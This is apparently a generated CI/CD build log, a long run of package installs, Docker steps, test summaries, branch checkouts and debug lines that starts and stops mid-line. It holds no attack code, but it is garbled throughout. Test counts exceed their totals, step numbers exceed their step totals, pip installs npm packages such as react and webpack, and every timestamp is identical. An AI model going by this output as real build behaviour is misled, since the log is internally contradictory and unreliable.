registry...\nFAILED: test_auth_login\nOK\nDone.\nUploading artifact 'build' (38 files)\nMinifying app.js\nWARNING: react has known vulnerabilities\nImage pulled successfully\n[12:47:36] WARN: Deprecated API usage\n[12:47:36] DEBUG: Memory usage: 115MB\nStep 1/22: Deploying\nCompiling lib/service.java...\n\u2713 All checks passed\npip: Installing build dependencies...\n[12:47:36] DEBUG: Initializing service\nnpm install: added 262 packages\nInstalling axios@4.1.1\nBundling runtime.css\nCompiling src/app.ts...\nOK\nMinifying vendor.js\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nCoverage: 99% statements, 86% branches\nTransforming 648 files...\n  PASS: test_api_health (362ms)\nNODE_ENV=production\nChecking out develop branch\nFetching from https://githubusercontent.com/package.json\nDone.\nWARNING: express has known vulnerabilities\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nVerifying...\nCache saved successfully\nAlready up to date.\n[12:47:36] DEBUG: Query executed in 89ms\nStep 7/25: Installing dependencies\nStep 15/16: Building\nMinifying main.js\nnpm notice: package.json updated\nSuccess!\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nPulling image: node:18\nStep 16/25: Installing dependencies\npip install: Successfully installed react-5.15\n[12:47:36] DEBUG: Memory usage: 1979MB\nStep 12/15: Deploying\n[12:47:36] DEBUG: Initializing service\nnpm install: resolved 1797 packages\npip: Collecting react\nFetching from https://registry.npmjs.org/package.json\n[12:47:36] INFO: Cache refreshed\nMinifying vendor.js\n[12:47:36] DEBUG: Loading configuration\nStep 5/20: Testing\nStep 1/15: Testing\nProcessing...\nInstalling axios@4.16.8\nStep 1/15: Deploying\nCompleted.\nCache hit for key-8995\nCache hit for key-9760\n[12:47:36] WARN: Deprecated API usage\n[12:47:36] WARN: Deprecated API usage\nFetching from https://googleapis.com/package.json\nProcessing...\nCompleted.\n\u2713 validate completed\n\u2713 Task completed in 2146ms\nCoverage: 72% statements, 79% branches\nCache invalidated: node_modules\nUsing Node.js 15.7.4\nTest Suites: 30 passed, 20 total\npip: Installing build dependencies...\n[12:47:36] INFO: Connecting to database\n[12:47:36] DEBUG: Initializing service\nSnapshots: 28 passed, 22 total\nPOST /data - 202 (447ms)\nSwitched to branch 'hotfix/task-697'\nUsing Python 3.12\n[12:47:36] WARN: Deprecated API usage\nReady.\npip: Downloading lodash-3.17.tar.gz\nImage pulled successfully\nTLS handshake completed\n\u2713 All checks passed\n[12:47:36] INFO: Starting build process\nTest Suites: 21 passed, 31 total\nnpm notice: package.json updated\nFinished.\nPOST /upload - 200 (92ms)\nCache miss for key-2917\n[12:47:36] DEBUG: Loading configuration\nTransforming 945 files...\nStep 9/20: Linting\n[12:47:36] DEBUG: Initializing service\nProcessing...\nArtifact downloaded: 14MB\n[12:47:36] INFO: Processing request\nCompiling src/handler.rs...\nChecking out develop branch\nTest Suites: 8 passed, 50 total\nStep 7/23: Building\nTest Suites: 24 passed, 16 total\nLoading...\nImage pulled successfully\n[12:47:36] INFO: Processing request\nArtifact downloaded: 24MB\nHEAD is now at 5486a6f\nReady.\nGET /status - 201 (28ms)\nyarn add: Done in 2.12s\nWARNING: axios has known vulnerabilities\nCompleted.\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nWaiting...\nCache hit for key-2756\nStep 2/23: Running migrations\nCache restored successfully (68MB)\nUsing Python 3.9\nnpm notice: created a lockfile\npip: Collecting webpack\nArtifact downloaded: 45MB\n  PASS: e2e/test_api_health.spec.js\n[12:47:36] INFO: Request completed\n[12:47:36] INFO: Request completed\nCompiling lib/index.js...\nArtifact uploaded: dist.zip (49MB)\n\u2713 All checks passed\nTests: 338 passed, 81 total\nArtifact uploaded: build.tar.gz (21MB)\nCompiling utils/app.ts...\nArtifact uploaded: build.tar.gz (26MB)\nInstalling webpack@5.14.7\nnpm notice: created a lockfile\nBundling vendor.css\nMinifying vendor.js\nCache restored successfully (378MB)\nBuilding Docker image...\nChecking out main branch\nCache miss for key-2255\nFetching submodules...\nUsing Python 3.11\nWARNING: eslint has known vulnerabilities\nUploading artifact 'dist' (12 files)\nSnapshots: 32 passed, 27 total\nTest Suites: 6 passed, 20 total\n[12:47:36] DEBUG: Loading configuration\nCompiling utils/handler.rs...\nArtifact downloaded: 8MB\nMinifying vendor.js\n[12:47:36] DEBUG: Initializing service\nVerifying...\n\u2713 package completed\n[12:47:36] INFO: Processing request\nUsing Python 3.11\n\u2713 Step 'build' succeeded\nUsing Python 3.12\nTest Suites: 21 passed, 22 total\nNODE_ENV=development\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n\u2713 package completed\nStep 14/23: Deploying\nNODE_ENV=test\nCompiling src/handler.rs...\nPushing to registry...\nTests: 427 passed, 432 total\nCompiling lib/service.java...\npip: Collecting prettier\nPlatform: win32-x64\n[12:47:36] DEBUG: Initializing service\n[12:47:36] ERROR: Connection failed\nAlready up to date.\nCompiling utils/main.py...\nArtifact uploaded: dist.zip (84MB)\nSuccess!\nEnvironment: test\n[12:47:36] DEBUG: Initializing service\n=== Step unit_tests completed ===\n=== Step: type_check ===\nWARNING: react has known vulnerabilities\n[12:47:36] WARN: Deprecated API usage\n[12:47:36] INFO: Processing request\nPushing to registry...\npip: Collecting webpack\nCache hit for key-5332\nCoverage: 92% statements, 73% branches\nStep 2/19: Installing dependencies\nUsing Node.js 19.1.0\nStep 14/16: Running migrations\nArtifact uploaded: dist.zip (69MB)\n[12:47:36] DEBUG: Query executed in 66ms\nOK\nUploading artifact 'build' (23 files)\nTest Suites: 28 passed, 49 total\nStep 7/17: Linting\nCompleted.\nSwitched to branch 'bugfix/task-528'\nStep 16/17: Building\nPushing to registry...\nnpm install: resolved 1564 packages\nCompiling src/main.py...\nVerifying...\nTLS handshake completed\nDone.\nBundling main.css\nUsing Python 3.10\n[12:47:36] WARN: Deprecated API usage\nArtifact uploaded: dist.zip (18MB)\nCompiling utils/service.java...\n\u2717 build failed with exit code 110\npip install: Successfully installed prettier-3.4\nHEAD is now at 4bff999\nConnection established\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nCompiling components/main.py...\nGenerating source maps...\n\u2713 Step 'test' succeeded\nArtifact downloaded: 42MB\nInstalling react@3.3.6\n[12:47:36] DEBUG: Connection pool: 13 active\nBundling main.css\nnpm install: resolved 781 packages\nCompleted.\nTransforming 274 files...\nCache restored successfully (114MB)\nUploading artifact 'dist' (9 files)\nWARNING: prettier has known vulnerabilities\nImage pulled successfully\nSwitched to branch 'feature/task-890'\nCompiling lib/service.java...\nHEAD is now at f5e33a7\nCompleted.\nBundling styles.js\nPlatform: darwin-arm64\nCompiling lib/utils.go...\nFinished.\nLayer 9/15: ENV command\n  PASS: unit/test_user_create.spec.js\nWARNING: react has known vulnerabilities\nUploading artifact 'dist' (2 files)\nWARNING: eslint has known vulnerabilities\nTest Suites: 38 passed, 33 total\nStep 8/21: Linting\nnpm install: added 241 packages\nChecking out develop branch\n[12:47:36] ERROR: Connection failed\nLayer 6/15: COPY command\n[12:47:36] INFO: Connecting to database\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nnpm install: resolved 1513 packages\nPlatform: linux-x64\nRan 43 tests in 49s\nCreating production build...\nChecking out main branch\nStep 12/25: Deploying\nStep 19/16: Deploying\n\u2713 All checks passed\nImage pulled successfully\n\u2713 All checks passed\nStep 10/18: Running migrations\n[12:47:36] DEBUG: Initializing service\nCreating production build...\nBuilding Docker image...\nWARNING: express has known vulnerabilities\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nnpm install: resolved 121 packages\nPlatform: win32-x64\nTest Suites: 40 passed, 11 total\nUsing Node.js 17.7.7\nConnection established\nArtifact uploaded: dist.zip (10MB)\nCache saved successfully\n\u2713 Task completed in 459ms\nCompleted.\nUsing Node.js 20.10.2\nUsing Python 3.10\nCompiling components/app.ts...\nSnapshots: 11 passed, 4 total\nStep 7/18: Building\n\u2713 Step 'checkout' succeeded\n\u2713 All checks passed\n[12:47:36] INFO: Cache refreshed\nFetching from https://github.com/package.json\n[12:47:36] DEBUG: Loading configuration\nCompiling src/main.py...\nAlready up to date.\nOK\nConnection established\nPulling image: alpine:latest\nPushing to registry...\nArtifact downloaded: 14MB\n[12:47:36] DEBUG: Query executed in 67ms\nChecking out main branch\nGenerating source maps...\nArtifact uploaded: build.tar.gz (4MB)\nSwitched to branch 'bugfix/task-396'\n\u2713 All checks passed\nException: NullPointerException\nLoading...\n\u2713 package completed\nUploading artifact 'dist' (12 files)\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nStep 20/22: Linting\nCache saved successfully\nBuilding Docker image...\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nStep 5/24: Testing\nPushing to registry...\nCompiling src/main.py...\nProcessing...\nStep 13/15: Building\nFetching submodules...\nCache invalidated: build\nTest Suites: 16 passed, 47 total\nReady.\npip: Downloading lodash-2.5.tar.gz\nStep 13/23: Testing\n\u2717 build failed with exit code 24\nUsing Node.js 15.20.6\nCache miss for key-6210\nCompiling utils/service.java...\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nSnapshots: 48 passed, 9 total\npip install: Successfully installed axios-4.20\nCoverage: 92% statements, 83% branches\nPushing to registry...\nSuccess!\nCache miss for key-3316\n[12:47:36] WARN: Deprecated API usage\n\u2713 All checks passed\nCompiling lib/main.py...\nPushing to registry...\nInstalling eslint@3.9.3\nAlready up to date.\nProcessing...\nPlatform: darwin-arm64\nLoading...\nBuilding Docker image...\nnpm install: added 451 packages\nBundling vendor.js\n\u2713 Step 'test' succeeded\nCache restored successfully (268MB)\n[12:47:36] DEBUG: Loading configuration\nProcessing...\nnpm install: resolved 1554 packages\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nBuilding Docker image...\nGenerating source maps...\nOptimizing 98 modules...\n[12:47:36] INFO: Request completed\nCompiling components/index.js...\nFetching from https://registry.npmjs.org/package.json\n\u2713 All checks passed\nCompiling src/index.js...\n\u2713 test completed\nGET /health - 201 (26ms)\n[12:47:36] WARN: Deprecated API usage\n[12:47:36] INFO: Processing request\npip: Installing build dependencies...\npip: Installing build dependencies...\nLoading...\nCreating production build...\nCache saved successfully\nCache saved successfully\nTest Suites: 6 passed, 36 total\nCreating production build...\nWARNING: eslint has known vulnerabilities\nCompleted.\nnpm notice: package.json updated\nUsing Python 3.11\nStep 15/20: Building\nGET /status - 204 (60ms)\n[12:47:36] DEBUG: Initializing service\n[12:47:36] DEBUG: Memory usage: 534MB\npip install: Successfully installed webpack-1.19\n[12:47:36] INFO: Processing request\nChecking out master branch\nMinifying app.js\nEnvironment: test\nOptimizing 23 modules...\nSwitched to branch 'hotfix/task-208'\nyarn add: Done in 26.17s\nPOST /api - 200 (128ms)\nCache hit for key-8583\nRan 25 tests in 23s\n\u2713 All checks passed\nDone.\n[12:47:36] INFO: Cache refreshed\nRan 98 tests in 18s\nBuilding Docker image...\n\u2713 Step 'checkout' succeeded\nStep 9/17: Deploying\n[12:47:36] INFO: Connecting to database\nRan 61 tests in 28s\nWARNING: express has known vulnerabilities\nRan 31 tests in 19s\nReady.\nStep 12/17: Installing dependencies\n\u2713 Step 'setup' succeeded\nConnection established\nOK\nEnvironment: development\nWARNING: eslint has known vulnerabilities\nSwitched to branch 'bugfix/task-615'\nCache invalidated: dependencies\nConnection established\nGET /api - 204 (49ms)\nSuccess!\nStep 8/24: Running migrations\nChecking out main branch\nCompleted.\nTest Suites: 14 passed, 30 total\nUsing Python 3.11\n  PASS: integration/test_db_connect.spec.js\nTest Suites: 40 passed, 12 total\nDone.\n[12:47:36] DEBUG: Initializing service\n[12:47:36] INFO: Connecting to database\nBundling vendor.css\nTests: 279 passed, 259 total\n[12:47:36] WARN: Deprecated API usage\n=== Step type_check completed ===\n=== Step: checkout ===\nLayer 2/10: ENV command\nMinifying app.js\nReady.\nVerifying...\nOptimizing 15 modules...\nnpm notice: package.json updated\n  PASS: integration/test_cache_hit.spec.js\nRan 175 tests in 7s\nSwitched to branch 'feature/task-657'\nDone.\nBundling vendor.js\nnpm notice: package.json updated\nCompiling utils/app.ts...\nCache saved successfully\nSnapshots: 12 passed, 14 total\nCache restored successfully (422MB)\nUsing Node.js 17.4.4\n[12:47:36] INFO: Processing request\nnpm notice: package.json updated\nGET /api - 204 (87ms)\nStep 12/24: Running migrations\n\u2713 Task completed in 1666ms\nCreating production build...\nTests: 396 passed, 182 total\nnpm install: added 241 packages\n[12:47:36] WARN: Deprecated API usage\n  PASS: test_user_create (132ms)\nTime: 78.972s\n  PASS: unit/test_cache_hit.spec.js\n[12:47:36] DEBUG: Connection pool: 19 active\n\u2713 All checks passed\n[12:47:36] DEBUG: Connection pool: 10 active\nReady.\nAlready up to date.\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nSnapshots: 1 passed, 38 total\nStep 20/23: Running migrations\npip: Collecting webpack\nArtifact uploaded: build.tar.gz (2MB)\nOptimizing 20 modules...\nnpm install: added 27 packages\n[12:47:36] DEBUG: Connection pool: 10 active\n[12:47:36] INFO: Cache refreshed\nInstalling jest@4.16.2\n[12:47:36] WARN: Deprecated API usage\nTransforming 454 files...\nStep 16/25: Running migrations\nMinifying app.js\nStep 6/20: Running migrations\nCache restored successfully (335MB)\nProcessing...\nNODE_ENV=test\nImage pulled successfully\n[12:47:36] DEBUG: Connection pool: 5 active\n  PASS: test_auth_login (356ms)\npip: Collecting prettier\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nTest Suites: 28 passed, 35 total\n[12:47:36] WARN: Deprecated API usage\nWARNING: prettier has known vulnerabilities\nPOST /upload - 201 (49ms)\n[12:47:36] DEBUG: Loading configuration\n[12:47:36] DEBUG: Connection pool: 10 active\n[12:47:36] DEBUG: Connection pool: 2 active\n[12:47:36] WARN: Deprecated API usage\npip: Collecting axios\nPlatform: linux-x64\nCache invalidated: node_modules\nArtifact downloaded: 45MB\nSnapshots: 23 passed, 42 total\nCache miss for key-6171\n  PASS: integration/test_db_connect.spec.js\nUsing Python 3.12\n[12:47:36] INFO: Starting build process\nArtifact downloaded: 25MB\nStep 12/22: Building\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nTLS handshake completed\nStep 10/18: Deploying\nPulling image: node:latest\npip: Downloading react-2.17.tar.gz\n[12:47:36] DEBUG: Initializing service\npip: Collecting eslint\nLayer 5/12: ENV command\nOK\nFetching submodules...\nnpm install: resolved 1042 packages\nOK\nFinished.\nPushing to registry...\n[12:47:36] DEBUG: Memory usage: 947MB\nGenerating source maps...\nMinifying main.js\nWaiting...\n[12:47:36] WARN: Deprecated API usage\nCache restored successfully (158MB)\nWARNING: jest has known vulnerabilities\nArtifact uploaded: build.tar.gz (33MB)\nUsing Node.js 17.1.8\n\u2717 build failed with exit code 122\nStep 10/19: Running migrations\nWARNING: express has known vulnerabilities\nEnvironment: production\nStep 5/15: Installing dependencies\nTLS handshake completed\nnpm notice: created a lockfile\n[12:47:36] INFO: Cache refreshed\nStep 18/15: Linting\nArtifact downloaded: 37MB\nCoverage: 95% statements, 87% branches\nCompiling src/service.java...\n\u2713 Step 'checkout' succeeded\nUsing Node.js 16.3.6\npip: Installing build dependencies...\nCompiling src/handler.rs...\nTLS handshake completed\nOK\nSuccess!\nCompleted.\nCompiling src/utils.go...\n[12:47:36] DEBUG: Connection pool: 8 active\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nTests: 394 passed, 498 total\nTLS handshake completed\nUsing Node.js 15.11.1\n  PASS: test_auth_login (66ms)\nCache restored successfully (258MB)\n[12:47:36] INFO: Cache refreshed\n\u2713 Task completed in 771ms\nSwitched to branch 'feature/task-795'\nUsing Node.js 18.1.7\n[12:47:36] INFO: Connecting to database\nStep 1/23: Building\nPushing to registry...\n\u2713 Task completed in 1104ms\nnpm notice: package.json updated\n\u2713 All checks passed\nOptimizing 54 modules...\nStep 8/25: Linting\n[12:47:36] DEBUG: Query executed in 66ms\n[12:47:36] DEBUG: Loading configuration\nPOST /upload - 200 (68ms)\nCache invalidated: node_modules\nWARNING: react has known vulnerabilities\nFetching submodules...\nArtifact uploaded: dist.zip (18MB)\nWARNING: webpack has known vulnerabilities\nTime: 115.193s\nStep 6/24: Testing\nNODE_ENV=development\nPOST /data - 200 (118ms)\n[12:47:36] INFO: Starting build process\n[12:47:36] INFO: Connecting to database\nCreating production build...\nException: NullPointerException\nCoverage: 84% statements, 95% branches\nOptimizing 57 modules...\nPOST /api - 202 (14ms)\nCompiling src/app.ts...\nTLS handshake completed\n  PASS: test_user_create (466ms)\nCache restored successfully (104MB)\npip: Installing build dependencies...\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nFetching from https://pypi.org/package.json\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nTest Suites: 13 passed, 34 total\n[12:47:36] DEBUG: Memory usage: 1397MB\nArtifact uploaded: build.tar.gz (12MB)\nRan 67 tests in 30s\nStep 15/19: Building\nCache restored successfully (468MB)\nCompiling lib/service.java...\nTest Suites: 7 passed, 20 total\nHEAD is now at 639ddd1\nOptimizing 41 modules...\npip: Downloading axios-5.3.tar.gz\nRan 98 tests in 23s\n[12:47:36] DEBUG: Query executed in 93ms\n[12:47:36] DEBUG: Loading configuration\n\u2713 Step 'checkout' succeeded\nTLS handshake completed\n[12:47:36] INFO: Connecting to database\nStep 16/15: Deploying\nPulling image: python:3.11\nStep 17/22: Testing\nGenerating source maps...\nReady.\nFetching from https://googleapis.com/package.json\nReady.\nUsing Python 3.11\n[12:47:36] DEBUG: Query executed in 28ms\n[12:47:36] DEBUG: Loading configuration\n[12:47:36] WARN: Deprecated API usage\nArtifact downloaded: 4MB\nLayer 10/10: RUN command\nMinifying main.js\nConnection established\nnpm notice: created a lockfile\nLoading...\n[12:47:36] DEBUG: Initializing service\n[12:47:36] DEBUG: Initializing service\nFinished.\nEnvironment: staging\n[12:47:36] WARN: Deprecated API usage\n[12:47:36] WARN: Deprecated API usage\nnpm notice: package.json updated\npip install: Successfully installed jest-2.0\n[12:47:36] INFO: Cache refreshed\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nNODE_ENV=development\nSwitched to branch 'hotfix/task-216'\n[12:47:36] DEBUG: Connection pool: 16 active\nCache invalidated: build\nPlatform: linux-x64\nTime: 102.511s\nCompiling lib/app.ts...\nInstalling prettier@3.15.8\nyarn add: Done in 12.52s\n  PASS: integration/test_auth_login.spec.js\nWARNING: lodash has known vulnerabilities\n\u2713 Step 'build' succeeded\npip: Downloading webpack-1.18.tar.gz\nCache miss for key-9077\nBundling styles.css\nPOST /api - 202 (330ms)\nCache hit for key-3494\nCoverage: 91% statements, 85% branches\nTLS handshake completed\n[12:47:36] DEBUG: Connection pool: 14 active\nGET /status - 200 (37ms)\npip: Downloading eslint-3.19.tar.gz\nReady.\nWARNING: lodash has known vulnerabilities\nCache invalidated: dependencies\nStep 20/19: Deploying\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n[12:47:36] DEBUG: Query executed in 99ms\n[12:47:36] DEBUG: Loading configuration\nSuccess!\nWARNING: jest has known vulnerabilities\n=== Step checkout completed ===\n=== Step: deploy_production ===\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nOptimizing 38 modules...\nLoading...\nCache saved successfully\nInstalling react@2.2.7\nCompiling utils/service.java...\nStep 17/15: Running migrations\n  PASS: e2e/test_user_create.spec.js\nOptimizing 29 modules...\nConnection established\nnpm install: added 187 packages\nGET /api - 204 (12ms)\nInstalling react@2.12.7\nWARNING: prettier has known vulnerabilities\n  PASS: unit/test_user_create.spec.js\nCache invalidated: build\nWARNING: webpack has known vulnerabilities\nArtifact uploaded: build.tar.gz (26MB)\nUploading artifact 'build' (14 files)\npip: Downloading axios-2.15.tar.gz\nOK\nBuilding Docker image...\nnpm install: added 29 packages\nnpm notice: created a lockfile\nCompiling src/utils.go...\nEnvironment: test\nInstalling prettier@4.17.10\nCompiling src/utils.go...\nCompiling lib/main.py...\nCache hit for key-3453\nWARNING: jest has known vulnerabilities\nStep 2/16: Installing dependencies\nCreating production build...\nnpm install: resolved 394 packages\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nChecking out develop branch\nTransforming 913 files...\nTime: 26.990s\nCoverage: 100% statements, 89% branches\nBundling styles.js\nSnapshots: 22 passed, 33 total\n  PASS: test_auth_login (43ms)\n[12:47:36] INFO: Cache refreshed\nLayer 7/15: COPY command\n[12:47:36] DEBUG: Query executed in 85ms\nnpm install: resolved 1988 packages\nHEAD is now at 199c016\nnpm install: resolved 1906 packages\n[12:47:36] WARN: Deprecated API usage\nRan 190 tests in 7s\nBuilding Docker image...\n[12:47:36] DEBUG: Connection pool: 20 active\nyarn add: Done in 15.31s\nBuilding Docker image...\npip install: Successfully installed webpack-3.16\n[12:47:36] DEBUG: Memory usage: 1616MB\nEnvironment: development\n[12:47:36] DEBUG: Initializing service\nAlready up to date.\n[12:47:36] ERROR: Connection failed\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nUsing Node.js 19.1.7\nFetching from https://pypi.org/package.json\n\u2713 Step 'checkout' succeeded\nPushing to registry...\nBundling vendor.css\n[12:47:36] INFO: Starting build process\npip install: Successfully installed lodash-2.7\nLoading...\nHEAD is now at efe9797\nOptimizing 29 modules...\nFinished.\nEnvironment: staging\nCompiling lib/handler.rs...\nProcessing...\n[12:47:36] INFO: Cache refreshed\nPulling image: python:3.11\npip: Installing build dependencies...\n[12:47:36] INFO: Starting build process\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nArtifact uploaded: dist.zip (87MB)\nStep 1/15: Running migrations\n[12:47:36] INFO: Request completed\nSwitched to branch 'hotfix/task-342'\nStep 8/15: Building\nSwitched to branch 'feature/task-577'\npip: Installing build dependencies...\n\u2717 build failed with exit code 8\nChecking out develop branch\nOK\nSnapshots: 1 passed, 17 total\nHEAD is now at d378d00\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nFetching submodules...\nPOST /data - 202 (105ms)\nStep 18/24: Installing dependencies\nCache invalidated: build\npip: Downloading prettier-4.19.tar.gz\nEnvironment: test\nCompiling src/service.java...\nFAILED: test_db_connect\nPushing to registry...\nMinifying vendor.js\npip: Collecting react\nyarn add: Done in 23.14s\nnpm install: resolved 1937 packages\n[12:47:36] WARN: Deprecated API usage\n[12:47:36] DEBUG: Connection pool: 11 active\n  PASS: unit/test_api_health.spec.js\nGET /status - 201 (18ms)\nCompiling utils/service.java...\nWARNING: axios has known vulnerabilities\nStep 3/24: Installing dependencies\nFAILED: test_api_health\nException: TypeError\nCache saved successfully\nCache hit for key-1384\nPlatform: win32-x64\nCoverage: 75% statements, 94% branches\n\u2713 Step 'install' succeeded\n[12:47:36] INFO: Starting build process\nEnvironment: production\n\u2717 build failed with exit code 56\nPlatform: darwin-arm64\nDone.\nOptimizing 49 modules...\nNODE_ENV=development\nCompiling components/handler.rs...\nCompiling lib/index.js...\nStep 14/24: Running migrations\n  PASS: unit/test_cache_hit.spec.js\nWARNING: lodash has known vulnerabilities\n[12:47:36] INFO: Starting build process\nWARNING: eslint has known vulnerabilities\nTests: 301 passed, 202 total\n[12:47:36] DEBUG: Initializing service\nChecking out main branch\nArtifact uploaded: build.tar.gz (26MB)\nCompiling lib/utils.go...\n\u2717 build failed with exit code 50\nStep 1/23: Running migrations\nCoverage: 82% statements, 78% branches\n[12:47:36] DEBUG: Query executed in 25ms\nNODE_ENV=test\nGenerating source maps...\nVerifying...\nEnvironment: development\nChecking out main branch\nFetching from https://docker.io/package.json\npip: Installing build dependencies...\nCompiling utils/handler.rs...\n\u2713 All checks passed\nTLS handshake completed\nUploading artifact 'build' (16 files)\nDone.\nRan 78 tests in 11s\nWARNING: prettier has known vulnerabilities\nProcessing...\npip: Collecting prettier\nnpm notice: created a lockfile\nCache saved successfully\nRan 35 tests in 36s\npip: Collecting webpack\nPlatform: linux-x64\n[12:47:36] WARN: Deprecated API usage\nCompleted.\nTime: 88.188s\nCompiling src/service.java...\nException: TypeError\nRan 88 tests in 11s\nConnection established\nBundling vendor.js\nReady.\nReady.\nUsing Python 3.11\nFinished.\npip: Installing build dependencies...\nArtifact uploaded: build.tar.gz (33MB)\nOptimizing 46 modules...\n\u2717 build failed with exit code 30\n[12:47:36] INFO: Connecting to database\nFetching from https://pypi.org/package.json\nnpm install: added 174 packages\nPOST /data - 201 (74ms)\nCache saved successfully\nnpm install: added 390 packages\nnpm install: added 182 packages\nnpm notice: package.json updated\nFetching from https://github.com/package.json\nCompiling utils/index.js...\nAlready up to date.\nUploading artifact 'build' (4 files)\nSnapshots: 36 passed, 36 total\nFAILED: test_db_connect\nStep 18/19: Building\n[12:47:36] INFO: Cache refreshed\nUploading artifact 'build' (24 files)\nPOST /api - 200 (412ms)\nOK\nSnapshots: 16 passed, 41 total\nNODE_ENV=production\nVerifying...\nnpm notice: package.json updated\nnpm notice: created a lockfile\n  PASS: e2e/test_user_create.spec.js\npip install: Successfully installed eslint-4.0\n  PASS: test_cache_hit (279ms)\nStep 1/17: Deploying\nPlatform: darwin-arm64\nLayer 8/13: ENV command\nEnvironment: staging\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nPlatform: darwin-arm64\nCache saved successfully\n[12:47:36] INFO: Starting build process\npip install: Successfully installed webpack-4.19\nCompiling lib/utils.go...\n[12:47:36] INFO: Starting build process\nOK\nCreating production build...\nFetching submodules...\n\u2713 Task completed in 1433ms\nFetching from https://npmjs.org/package.json\nStep 20/25: Linting\nCompiling utils/handler.rs...\nStep 16/24: Linting\nLayer 3/14: RUN command\nLayer 7/15: RUN command\n[12:47:36] WARN: Deprecated API usage\nWARNING: lodash has known vulnerabilities\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nStep 2/20: Linting\nSuccess!\n[12:47:36] INFO: Processing request\nChecking out main branch\nLayer 2/9: ENV command\nStep 9/18: Installing dependencies\nCache saved successfully\nTLS handshake completed\nArtifact uploaded: dist.zip (88MB)\nStep 11/18: Running migrations\nStep 1/23: Deploying\n=== Step deploy_production completed ===\n=== Step: integration_tests ===\nCompiling components/app.ts...\n[12:47:36] ERROR: Connection failed\nBuilding Docker image...\n\u2713 package completed\nCompiling src/app.ts...\nPlatform: win32-x64\nNODE_ENV=test\nnpm install: resolved 1367 packages\nStep 15/21: Deploying\nGenerating source maps...\n[12:47:36] INFO: Processing request\npip: Collecting jest\n\u26a0 DEPRECATION: Feature will be removed in v2.0\npip: Installing build dependencies...\nUploading artifact 'dist' (46 files)\npip: Collecting jest\nnpm notice: created a lockfile\nWARNING: eslint has known vulnerabilities\n[12:47:36] INFO: Connecting to database\n[12:47:36] WARN: Deprecated API usage\nMinifying main.js\nnpm notice: created a lockfile\nnpm install: added 408 packages\npip: Installing build dependencies...\npip install: Successfully installed jest-3.5\nTLS handshake completed\nGET /status - 200 (80ms)\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nCompleted.\nFAILED: test_api_health\nBuilding Docker image...\nCreating production build...\nWARNING: react has known vulnerabilities\npip: Collecting express\nArtifact uploaded: build.tar.gz (47MB)\npip: Collecting eslint\nSnapshots: 45 passed, 18 total\n[12:47:36] DEBUG: Connection pool: 14 active\nBundling styles.js\nHEAD is now at cf8068f\nTime: 85.983s\n  PASS: test_db_connect (339ms)\n[12:47:36] DEBUG: Initializing service\n[12:47:36] WARN: Deprecated API usage\n[12:47:36] ERROR: Connection failed\nSwitched to branch 'bugfix/task-371'\n[12:47:36] DEBUG: Initializing service\nTransforming 954 files...\nConnection established\n[12:47:36] ERROR: Connection failed\n\u2713 Step 'test' succeeded\nyarn add: Done in 7.40s\nSnapshots: 12 passed, 0 total\nInstalling express@1.17.9\n\u2713 All checks passed\n[12:47:36] DEBUG: Memory usage: 1733MB\nChecking out main branch\n[12:47:36] INFO: Starting build process\nnpm notice: created a lockfile\nCompiling components/index.js...\nStep 5/25: Linting\nCompiling lib/service.java...\nCache hit for key-3610\nBundling runtime.css\nUsing Python 3.10\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nUsing Node.js 18.12.5\nArtifact uploaded: build.tar.gz (16MB)\nInstalling react@4.3.0\n[12:47:36] INFO: Starting build process\npip: Collecting prettier\n[12:47:36] ERROR: Connection failed\nVerifying...\n  PASS: e2e/test_auth_login.spec.js\n\u2713 Step 'build' succeeded\nChecking out master branch\nMinifying main.js\nCompiling lib/main.py...\nWaiting...\n  PASS: integration/test_cache_hit.spec.js\nWaiting...\nBundling runtime.css\nTransforming 416 files...\n[12:47:36] INFO: Cache refreshed\nGenerating source maps...\nCache invalidated: build\nSwitched to branch 'bugfix/task-394'\nArtifact uploaded: build.tar.gz (4MB)\nMinifying app.js\n[12:47:36] ERROR: Connection failed\n[12:47:36] INFO: Processing request\n[12:47:36] INFO: Connecting to database\nArtifact uploaded: dist.zip (88MB)\nnpm install: resolved 1309 packages\nUsing Python 3.12\nTest Suites: 9 passed, 11 total\n[12:47:36] WARN: Deprecated API usage\nWARNING: eslint has known vulnerabilities\nUsing Node.js 14.9.4\n\u2713 All checks passed\npip: Collecting jest\nEnvironment: test\npip: Installing build dependencies...\n\u2713 Task completed in 2438ms\nArtifact uploaded: build.tar.gz (31MB)\nnpm install: resolved 1241 packages\nCompiling utils/utils.go...\nGET /health - 201 (75ms)\nnpm notice: created a lockfile\n\u2713 Task completed in 3415ms\nTransforming 492 files...\nWaiting...\nAlready up to date.\nnpm notice: created a lockfile\nTime: 77.710s\nProcessing...\nFetching submodules...\nNODE_ENV=production\nRan 32 tests in 42s\nFinished.\nWaiting...\nAlready up to date.\nnpm install: resolved 1986 packages\nChecking out develop branch\nFinished.\nCompiling lib/utils.go...\nConnection established\nnpm notice: created a lockfile\npip: Installing build dependencies...\n\u2717 build failed with exit code 11\nFetching from https://docker.io/package.json\nOptimizing 53 modules...\n[12:47:36] DEBUG: Memory usage: 